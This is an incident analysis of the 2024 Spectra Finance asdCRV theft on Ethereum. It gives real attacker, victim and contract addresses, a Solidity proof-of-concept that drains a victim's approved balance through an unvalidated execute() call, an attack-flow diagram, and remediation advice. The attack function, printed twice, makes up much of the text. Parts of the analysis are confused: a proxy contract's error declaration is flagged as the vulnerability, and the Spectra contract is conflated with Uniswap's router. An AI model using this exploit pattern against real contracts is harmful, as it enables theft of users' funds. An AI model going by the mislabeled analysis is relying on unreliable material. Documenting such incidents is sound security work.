# Spectra Finance — Unauthorized asdCRV Transfer via Universal Router Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-26 |
| **Protocol** | Spectra Finance |
| **Chain** | Ethereum |
| **Loss** | ~73,000 USD |
| **Attacker** | [0x53635bf7b92b9512f6de0eb7450b26d5d1ad9a4c](https://etherscan.io/address/0x53635bf7b92b9512f6de0eb7450b26d5d1ad9a4c) |
| **Attack Tx** | [0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744](https://etherscan.io/tx/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744) |
| **Vulnerable Contract** | [0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a](https://etherscan.io/address/0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a) |
| **Root Cause** | Uniswap Universal Router (0x3593564c) executes arbitrary commands and data, allowing transferFrom |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Spectra_finance_exp.sol) |

---

## 1. Vulnerability Overview

Spectra Finance's vulnerable contract (`0x3d20601a`) was able to internally invoke the `execute()` function (selector `0x3593564c`) of the Uniswap Universal Router. The attacker passed `command = 0x12` (custom command) along with `transferFrom(victim, attacker, balance)` encoded data to transfer the victim's (`0x279a7DBF...`) entire asdCRV balance to the attacker. A total of approximately $73,000 worth of asdCRV was stolen.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: execute() runs arbitrary commands and data without validation
// VulnContract (0x3d20601a) → Uniswap Universal Router (0x3593564c)
function attack() public {
    bytes memory datas = abi.encode(
        address(asdCRV),
        address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
        0,
        address(this),
        1,
        abi.encodeWithSelector(
            bytes4(0x23b872dd),  // transferFrom
            address(victim),     // from: victim
            address(this),       // to: attacker
            asdCRV.balanceOf(address(victim))  // amount: victim's entire balance
        )
    );
    bytes memory command = hex"12";
    bytes[] memory data = new bytes[](1);
    data[0] = datas;
    // ❌ Calls Universal Router execute() through the vulnerable contract
    address(VulnContract).call(
        abi.encodeWithSelector(bytes4(0x3593564c), command, data, block.timestamp + 20)
    );
}

// ✅ Correct code: execute() only processes allowed commands
function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external {
    for (uint256 i = 0; i < commands.length; i++) {
        bytes1 command = bytes1(commands[i]);
        require(allowedCommands[command], "Command not allowed");  // ✅ command whitelist
        _dispatch(command, inputs[i]);
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: AMTransparentUpgradeableProxy.sol
contract AMTransparentUpgradeableProxy is ERC1967Proxy {
    // An immutable address for the admin to avoid unnecessary SLOADs before each call
    // at the expense of removing the ability to change the admin once it's set.
    // This is acceptable if the admin is always a ProxyAdmin instance or similar contract
    // with its own ability to transfer the permissions to another account.
    address private immutable _admin;

    /**
     * @dev The initial authority is not a valid account. (eg. `address(0)`)
     */
    error AMInvalidInitialAuthority(address initialAuthority);  // ❌ vulnerability
    /**
     * @dev The proxy caller is the current admin, and can't fallback to the proxy target.
     */
    error ProxyDeniedAdminAccess();

    /**
     * @dev Initializes an upgradeable proxy managed by an instance of a {ProxyAdmin} with an `initialOwner`,
     * backed by the implementation at `_logic`, and optionally initialized with `_data` as explained in
     * {ERC1967Proxy-constructor}.
     */
    constructor(
        address _logic,
        address initialAuthority,
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Query victim's (0x279a7DBF) asdCRV balance
  │         └─► asdCRV.balanceOf(victim) = X asdCRV
  │
  ├─[2]─► Call vulnerable contract (0x3d20601a) with selector 0x3593564c
  │         └─► command = 0x12
  │         └─► data = abi.encode(asdCRV, ..., transferFrom(victim, attacker, X))
  │
  ├─[3]─► Vulnerable contract executes Universal Router execute()
  │         └─► Internally executes asdCRV.transferFrom(victim, attacker, X)
  │
  └─[4]─► Total loss: ~73,000 USD (asdCRV)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    address public VulnContract = 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a;
    address victim = 0x279a7DBFaE376427FFac52fcb0883147D42165FF;
    IERC20 asdCRV = IERC20(0x43E54C2E7b3e294De3A155785F52AB49d87B9922);

    function attack() public {
        // [1] Encode transferFrom data based on victim's balance
        bytes memory datas = abi.encode(
            address(asdCRV),
            address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
            0, address(this), 1,
            abi.encodeWithSelector(
                bytes4(0x23b872dd),         // transferFrom selector
                address(victim),            // from: victim address
                address(this),              // to: attacker address
                asdCRV.balanceOf(victim)    // amount: victim's entire balance
            )
        );
        bytes memory command = hex"12";
        bytes[] memory data = new bytes[](1);
        data[0] = datas;

        // [2] Call execute() on the vulnerable contract
        address(VulnContract).call(
            abi.encodeWithSelector(bytes4(0x3593564c), command, data, block.timestamp + 20)
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Technique** | Universal Router Command Bypass via Malicious Encoding |
| **DASP Category** | Access Control |
| **CWE** | CWE-20: Improper Input Validation |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Command whitelist**: Apply a whitelist in `execute()` so that only permitted command bytes are processed.
2. **Block transferFrom**: Explicitly prohibit calls to the `transferFrom` selector (`0x23b872dd`) inside execute.
3. **Protect victim addresses**: Restrict the contract from moving a specific user's assets on their behalf.
4. **Validate encoded input data**: Parse and validate the function selectors embedded within encoded data to verify safety.

## 7. Lessons Learned

- **Universal Router risk**: The general-purpose router pattern is highly convenient, but permitting arbitrary command execution creates a bypass path for dangerous calls such as `transferFrom`.
- **Abuse of victim's prior approval**: This is a case where an approval previously granted by the victim to the contract was weaponized as the attack vector.
- **Inspect encoded calldata**: Function selectors embedded inside externally supplied encoded data must also be validated.